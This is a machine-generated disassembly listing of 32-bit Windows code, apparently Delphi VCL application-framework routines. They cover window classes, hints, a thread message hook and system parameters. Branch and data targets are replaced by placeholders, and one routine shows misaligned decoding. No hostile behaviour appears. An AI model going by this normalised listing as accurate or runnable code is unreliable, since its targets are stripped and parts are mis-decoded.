cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_456764
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_4568a0 ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_456914
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45606c
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc edi
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov al [ ebx + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp - 0x8 ]
call sub_4137ac
mov dl [ ebp - 0x1 ]
call sub_456764
pop ecx
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_456058
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov al [ eax + 0x5b ]
cmp al [ ebp - 0x1 ]
jne r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp [ eax + 0x22b ] 0x1
je r-xdata
cmp [ ebx + 0x22b ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_413650
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0xc ]
je r-xdata
xor esi esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp esi [ eax + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx ebx
mov edx esi
call sub_413828
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx esi
call sub_4137ac
mov edx eax
mov cl [ ebp - 0x1 ]
mov eax ebx
call sub_456704
test al al
je r-xdata
inc esi
sub_456a60
push ebp
mov ebp esp
push ebx
push esi
mov bl 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_45606c
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx esi
call sub_456058
cmp [ eax + 0x30 ] 0x0
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
test [ eax + 0x1c ] 0x10
jne r-xdata
cmp [ eax + 0x5b ] 0x0
je r-xdata
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
sub_456ab8
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x10 ] eax
push ebp
call sub_456a60
pop ecx
test al al
je r-xdata
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_456b32
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_456914
pop ecx
push ebp
mov al 0x2
call sub_456914
pop ecx
push ebp
mov al 0x3
call sub_456914
pop ecx
push ebp
mov al 0x4
call sub_456914
pop ecx
push ebp
mov al 0x5
call sub_456914
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403258
retn
sub_456b40
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4566d4
xor eax eax
push ebp
push sub_456bb9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_456ab8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x8e ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_4566dc
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x8e ] 0x10
jmp r-xdata
pop ebx
mov esp ebp
pop ebp
retn
sub_456bd4
push ebx
push esi
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_403f90
pop esi
pop ebx
retn
cmp [ ebx + 0x80 ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x80 ]
call sub_403fe4
pop esi
pop ebx
retn
mov ebx [ ebx + 0x30 ]
jmp r-xdata
test ebx ebx
jne r-xdata
sub_456c2c
push ebp
mov ebp esp
push ebx
push esi
push edi
cmp [ rw-data ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
xor eax eax
push ebp
push j_sub_4036e0#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_459078
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_456c80
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx rw-data
call GetCurrentThreadId
mov [ rw-data ] eax
jmp r-xdata
push 0x64
mov eax [ rw-data ]
push eax
call WaitForSingleObject
cmp eax 0x102
je r-xdata
cmp [ ebx ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
call GetCursorPos
lea eax [ ebp - 0x8 ]
call sub_4372b8
test eax eax
jne r-xdata
mov eax [ ebx ]
call sub_4590f4
sub_456cdc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
push esi
mov eax [ ebp + 0xc ]
push eax
push ebx
mov eax [ rw-data ]
push eax
call CallNextHookEx
mov edi eax
test ebx ebx
jl r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ rw-data ] 0x0
je r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_458194
sub_456d20
push ecx
mov eax [ rw-data ]
cmp [ eax + 0xa5 ] 0x0
jne r-xdata
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
call GetCurrentThreadId
push eax
push 0x0
mov eax sub_456cdc
push eax
push 0x3
call SetWindowsHookExA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call CreateEventA
mov [ rw-data ] eax
push esp
push 0x0
push 0x0
push sub_456c80
push 0x3e8
push 0x0
call CreateThread
mov [ rw-data ] eax
sub_456d94
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call UnhookWindowsHookEx
retn
mov eax [ rw-data ]
push eax
call SetEvent
call GetCurrentThreadId
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
push eax
call CloseHandle
xor eax eax
mov [ rw-data ] eax
push 0xffffffff
mov eax [ rw-data ]
push eax
call WaitForSingleObject
sub_456df0
add esp 0xfffffff8
mov [ esp ] 0x8
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x48
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
pop ecx
pop edx
retn
cmp [ esp + 0x4 ] 0x0
setne al
pop ecx
pop edx
retn
sub_456e20
add esp 0xfffffff8
mov [ esp ] 0x8
cmp al 0x1
cmc
sbb eax eax
mov [ esp + 0x4 ] eax
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x8
push 0x49
call SystemParametersInfoA
pop ecx
pop edx
retn
sub_456e48
push ebx
push esi
push edi
mov edi edx
mov esi eax
call sub_456df0
mov ebx eax
test bl bl
je r-xdata
push edi
push esi
call ShowWindow
test bl bl
je r-xdata
xor eax eax
call sub_456e20
pop edi
pop esi
pop ebx
retn
mov al 0x1
call sub_456e20
sub_456e88
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_41914c
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ rw-data ]
cmp [ eax + 0x2 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_458560
mov [ ebx + 0x34 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x90 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0xa8 ] eax
xor eax eax
mov [ ebx + 0x60 ] eax
xor eax eax
mov [ ebx + 0x84 ] eax
mov [ ebx + 0x5c ] 0xff000018
mov [ ebx + 0x78 ] 0x1f4
mov [ ebx + 0x7c ] 0x1
xor eax eax
mov [ ebx + 0x80 ] eax
mov [ ebx + 0x74 ] 0x9c4
mov [ ebx + 0x88 ] 0x0
mov [ ebx + 0x9d ] 0x1
mov [ ebx + 0xb4 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_4214a0
mov esi eax
mov [ ebx + 0x98 ] esi
push r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call LoadIconA
mov edx eax
mov eax esi
call sub_421870
mov eax [ ebx + 0x98 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_458cf8
push 0x100
lea eax [ ebp - 0x101 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetModuleFileNameA
lea eax [ ebp - 0x101 ]
push eax
lea eax [ ebp - 0x101 ]
push eax
call OemToCharA
lea eax [ ebp - 0x101 ]
mov dl 0x5c
call sub_40bfc0
test eax eax
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_458758
lea eax [ ebp - 0x101 ]
mov dl 0x2e
call sub_40bfe8
test eax eax
je r-xdata
lea edx [ eax + 0x1 ]
lea eax [ ebp - 0x101 ]
call sub_408378
lea eax [ ebp - 0x101 ]
inc eax
push eax
call CharLowerA
lea eax [ ebx + 0x8c ]
lea edx [ ebp - 0x101 ]
mov ecx 0x100
call sub_404200
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ eax ] 0x0
mov [ ebx + 0x59 ] 0x1
mov [ ebx + 0x5a ] 0x1
mov [ ebx + 0x5b ] 0x1
mov [ ebx + 0x9e ] 0x1
xor eax eax
mov [ ebx + 0xa0 ] eax
mov eax ebx
call sub_458ed4
mov eax ebx
call sub_4598e8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
call sub_457190
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_457071
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff0
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_4598f8
mov [ esp + 0x4 ] esi
mov [ esp ] sub_458560
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp ]
jne r-xdata
mov [ esp + 0xc ] esi
mov [ esp + 0x8 ] sub_458758
mov eax [ rw-data ]
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov [ esi + 0x9d ] 0x0
mov eax esi
call sub_4590f4
xor edx edx
mov eax esi
call sub_458a70
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
push esi
push sub_4575c4
mov eax esi
call sub_45834c
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
push eax
call FreeLibrary
cmp [ esi + 0x4c ] 0x0
je r-xdata
cmp [ esi + 0xa4 ] 0x0
je r-xdata
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4055cc
mov edx [ rw-data ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi + 0xa8 ]
call sub_403258
mov eax [ esi + 0x90 ]
call sub_403258
mov eax [ esi + 0x98 ]
call sub_403258
test bl bl
jle r-xdata
call sub_41a288
mov eax [ esi + 0x30 ]
push eax
call DestroyWindow
push 0x0
push 0x1
push 0x80
push eax
call SendMessageA
add esp 0x10
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_457190
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor edx edx
mov [ ebp - 0x2c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_457331
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457338
lea eax [ ebp - 0x2c ]
call sub_403f90
retn
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
push ebx
push sub_457710
call sub_41a1f0
mov [ ebx + 0x40 ] eax
mov eax DefWindowProcA
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
mov eax [ rw-data ]
mov [ rw-data ] eax
push rw-data
call RegisterClassA
test ax ax
jne r-xdata
push eax
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
call eax
sar eax 0x1
jns r-xdata
adc eax 0x0
lea edx [ ebp - 0x2c ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov eax [ ebx + 0x8c ]
call sub_404450
mov edx eax
mov ecx 0x84ca0000
mov eax [ rw-data ]
call sub_40693c
mov [ ebx + 0x30 ] eax
lea eax [ ebx + 0x8c ]
call sub_403f90
mov [ ebx + 0xa4 ] 0x1
mov eax [ ebx + 0x40 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x30 ]
push eax
call SetWindowLongA
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
adc eax 0x0
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call GetSystemMenu
mov ebx eax
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_457e14
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_457e14
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
push 0x0
push 0xf010
push ebx
call DeleteMenu
sub_457340
push ebx
push esi
mov ecx rw-data
cmp edx [ eax + 0x44 ]
jne r-xdata
cmp edx [ eax + 0x48 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x44 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x64 ]
jne r-xdata
xor ebx ebx
mov [ eax + 0x48 ] ebx
mov ebx [ ecx ]
cmp edx [ ebx + 0x68 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x64 ] esi
mov ebx [ ecx ]
cmp edx [ ebx + 0x78 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x68 ] esi
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x6c ] esi
cmp edx [ eax + 0x60 ]
jne r-xdata
mov ebx [ ecx ]
xor esi esi
mov [ ebx + 0x78 ] esi
mov eax [ ecx ]
call sub_456074
pop esi
pop ebx
retn
xor edx edx
mov [ eax + 0x60 ] edx
sub_4573a0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
or esi 0xffffffff
push 0x4
push ebx
call GetWindow
mov edx [ rw-data ]
cmp eax [ edx + 0x30 ]
jne r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] ebx
xor esi esi
mov eax [ rw-data ]
mov edi [ eax + 0x44 ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x90 ]
mov edx ebx
call sub_413650
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax edi
call sub_43f228
cmp ebx eax
je r-xdata
sub_457410
push ebx
push esi
add esp 0xfffffff8
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
inc [ ebx + 0x94 ]
mov eax [ ebx + 0x30 ]
mov [ esp ] eax
mov [ esp + 0x4 ] dl
mov eax esp
push eax
push sub_4573a0
call EnumWindows
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
push 0x3
mov eax [ esp + 0x4 ]
push eax
call GetWindow
mov esi eax
mov [ esp ] esi
push 0xffffffec
push esi
call GetWindowLongA
test al 0x8
je r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov [ esp ] 0xfffffffe
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ esp + 0x14 ]
push eax
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4137ac
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_457528
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x94 ] 0x0
jle r-xdata
dec [ ebx + 0x94 ]
cmp [ ebx + 0x94 ] 0x0
jne r-xdata
mov eax [ ebx + 0x90 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0x0
jl r-xdata
mov eax [ ebx + 0x90 ]
mov edx [ eax ]
call [ edx + 0x8 ]
push 0x213
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov edx esi
mov eax [ ebx + 0x90 ]
call sub_4137ac
push eax
call SetWindowPos
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_4575c4
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor ebx ebx
mov eax [ edi ]
cmp eax [ rw-data ]
je r-xdata
cmp [ esi + 0x59 ] 0x0
je r-xdata
cmp eax 0x1a
jne r-xdata
cmp [ esi + 0x5a ] 0x0
je r-xdata
push 0x400
call SetThreadLocale
call sub_40c288
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
call sub_456580
mov eax [ rw-data ]
call sub_456bc8
sub_45761c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_457679
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x13a ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_457680
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x8 ]
call sub_404188
mov eax [ ebp - 0x4 ]
push eax
lea eax [ esi + 0xc ]
push eax
mov ecx [ esi + 0x4 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
sub_457688
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call DefWindowProcA
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov [ edx + 0xc ] eax
pop ebp
retn
sub_4576c4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call BeginPaint
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_457e14
push eax
push 0x0
push 0x0
push ebx
call DrawIcon
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call EndPaint
pop ebx
mov esp ebp
pop ebp
retn
sub_457710
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push j_sub_4036e0#3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax + 0xc ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4575c4
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx ]
mov eax ebx
cmp eax 0x53
jg r-xdata
inc ebx
xor esi esi
cmp eax 0xb017
jg r-xdata
je r-xdata
inc esi
dec ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0xb020
jg r-xdata
je r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov edx [ ebp - 0x8 ]
mov dx [ edx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_458830
jmp r-xdata
cmp eax 0x16
jg r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xa8 ]
mov edx esi
call sub_4137ac
mov edi eax
mov edx [ ebp - 0x8 ]
mov eax [ edi + 0x4 ]
call [ edi ]
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub eax 0xb031
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp eax 0xb000
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp eax 0x1d
jg r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x1
jne r-xdata
add eax 0xfffffff2
sub eax 0x2
jb r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
sub eax 0xb01a
je r-xdata
mov esi eax
mov eax esi
call sub_43f228
test eax eax
je r-xdata
sub eax 0xb001
je r-xdata
je r-xdata
sub eax 0x37
je r-xdata
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp eax 0x14
ja r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0xb0 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xb0 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4597ac
and eax 0x7f
